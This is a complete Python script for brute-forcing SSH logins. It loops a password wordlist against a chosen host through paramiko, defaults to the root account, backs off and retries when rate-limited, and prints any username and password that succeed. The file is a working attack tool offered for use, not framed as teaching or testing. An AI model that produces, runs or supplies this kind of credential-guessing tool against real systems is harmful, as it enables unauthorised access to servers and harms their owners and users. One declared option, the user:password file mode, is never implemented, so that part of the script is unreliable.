#!/usr/bin/env python3

"""
SSH BruteForce script
"""

import argparse
import logging
import sys
import paramiko
import socket
import time
from colorama import init, Fore

# global variables
global args

# initializa colorama
init()
RED = Fore.RED
GREEN = Fore.GREEN
BLUE = Fore.BLUE
RESET = Fore.RESET


def parse_args():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("host", help="Hostname or IP address of target.")
    parser.add_argument("-p", "--port", default=22, help="Port (default=22).")
    parser.add_argument("-w", "--wordlist", help="Path to password wordlist (or user:password list, if used with -f).")
    filetype_select = parser.add_mutually_exclusive_group(required=True)
    filetype_select.add_argument("-u", "--user", default="root", help="Username (default=root).")
    filetype_select.add_argument("-f", "--full", action="store_true", help="Path to file content user:password on each line. Can not be used with -u.")
    parser.add_argument("-v", "--verbosity", type=int, choices=[0, 1, 2], default=0, help="Output verbosity 0: success only (default), 1: timeout report, 2: all messages.")

    return parser.parse_args()


def is_ssh_open(hostname, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, port=port, timeout=3)
        client.invoke_shell()
    except socket.timeout:
        if args.verbosity > 0:
            print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        if args.verbosity > 1:
            print(f"{RED}[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        if args.verbosity > 0:
            print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        time.sleep(60)
        return is_ssh_open(hostname, port, username, password)
    else:
        print(f"{GREEN}[+] Successful for\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True


def main():
    if sys.version_info < (3, 5, 0):
        sys.stderr.write("You need Python 3.5 or later to run this script.\n")
        sys.exit(1)
    try:
        wordlist = open(args.wordlist).read().splitlines()
    except Exception as e:
        logging.exception(f"Can not open wordlist. Check permissions or path.\n{e}")
        sys.exit(1)
    for password in wordlist:
        if is_ssh_open(args.host, args.port, args.user, password):
            break


if __name__ == '__main__':
    args = parse_args()
    # print(args)
    main()
